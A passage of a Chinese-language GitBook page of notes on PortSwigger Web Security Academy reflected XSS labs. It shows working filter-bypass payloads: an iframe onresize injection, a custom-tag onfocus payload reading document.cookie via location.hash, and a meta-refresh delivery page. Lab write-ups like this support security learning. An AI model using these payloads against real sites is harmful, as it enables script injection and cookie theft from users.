+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">this.style.width=&apos;100px&apos;</span>&gt;</span>
+</code></pre>
+<p>&#x9898;&#x89E3;&#x662F;&#x7528;&#x7684; <code>burp Intruder</code>&#x68C0;&#x6D4B;&#x3002;&#x770B;&#x6765; xss &#x5B57;&#x5178;&#x8FD8;&#x662F;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002;</p>
+<h2 id="lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> into HTML context with all tags blocked except custom ones</h2>
+<pre><code class="lang-html">/?search=<span class="hljs-tag">&lt;<span class="hljs-name">xss+id%3Dx+onfocus%3Dalert(document.cookie)%20tabindex=1</span>&gt;</span>#x
+</code></pre>
+<p>&#x7528;<code>location.hash</code>&#x914D;&#x5408; id &#x81EA;&#x52A8; focus &#x5230;&#x5143;&#x7D20;&#x4E0A;&#x89E6;&#x53D1; onfocus &#x4E8B;&#x4EF6;&#x3002;&#x5B66;&#x5230;&#x4E86;</p>
+<p>exploit-server &#x53EF;&#x4EE5;&#x7528; meta refresh &#x8DF3;&#x8F6C;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;0; url=&apos;https://0a6400b20383db3782698d65007c00b9.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&apos;&quot;</span>&gt;</span>
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <!-- <a href="羊城杯 2023 web writeup.html#20230903" class="navigation navigation-prev " aria-label="Previous page: 羊城杯 2023 web writeup">
+                    <i class="fa fa-angle-left"></i>
+                </a> -->
+                
+                
+                <!-- <a href="WMCTF 2023 web writeup.html#20230824" class="navigation navigation-next " aria-label="Next page: WMCTF2023 web writeup">
+                    <i class="fa fa-angle-right"></i>
+                </a> -->
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"webacademy XSS","level":"1.3","depth":1,"next":{"title":"WMCTF2023 web writeup","level":"1.4","depth":1,"anchor":"#20230824","path":"WMCTF 2023 web writeup.md","ref":"WMCTF 2023 web writeup.md#20230824","articles":[]},"previous":{"title":"羊城杯 2023 web writeup","level":"1.2","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"webacademy XSS.md","mtime":"2023-09-03T13:41:51.226Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-03T13:58:49.628Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
